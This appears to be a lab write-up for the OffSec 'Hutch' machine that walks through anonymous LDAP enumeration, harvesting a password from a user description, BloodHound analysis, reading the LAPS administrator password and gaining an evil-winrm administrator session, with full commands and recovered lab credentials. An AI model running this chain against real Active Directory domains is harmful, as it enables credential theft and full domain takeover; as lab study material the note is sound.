## Takeaway
- `ldapsearch` can also be performed anonymously. 
## Metadata
- From `nmap` result, one can identify that port `389` allows anonymous binding (`anonymous ldap search`).![[Pasted image 20240322183742.png]]
	- Run `ldapsearch -H ldap://192.168.222.122 -x -b "CN=Users,DC=hutch,DC=offsec" "objectClass=user" | grep "sAMAccountName" | awk -F: '{print $2}' | cut -c2- > domain_users.txt` to get a list of potential domain users.
	- Run `ldapsearch -H ldap://192.168.222.122 -x -b "CN=Users,DC=hutch,DC=offsec" "objectClass=user" | grep "description" -C 30`, one can identify user `hutch\fmcsorley`'s password is reset to `CrabSharkJellyfish192`.![[Pasted image 20240322185124.png]]
- Run `bloodhound-python -d hutch -u fmcsorley -p CrabSharkJellyfish192 -ns 192.168.222.122 -c all --zip` and upload to `bloodhound`.
	- Bloodhound will identify that user `fmcsorley` have `ReadLAPSPassword` privilege.![[Pasted image 20240322195301.png]]
	- Add `192.168.222.122 hutchdc.hutch.offsec` to `/etc/hosts` and Run `netexec ldap 192.168.222.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.222.122 -M laps` to retrieve local administrator password as `w8epk3kpp}7(Xq`.
# Exploitation
- Run `evil-winrm -i 192.168.222.122 -u administrator -p "w8epk3kpp}7(Xq" -d hutch` to obtain an interactive session as `hutch\administrator`.
# PrivEsc
- No Need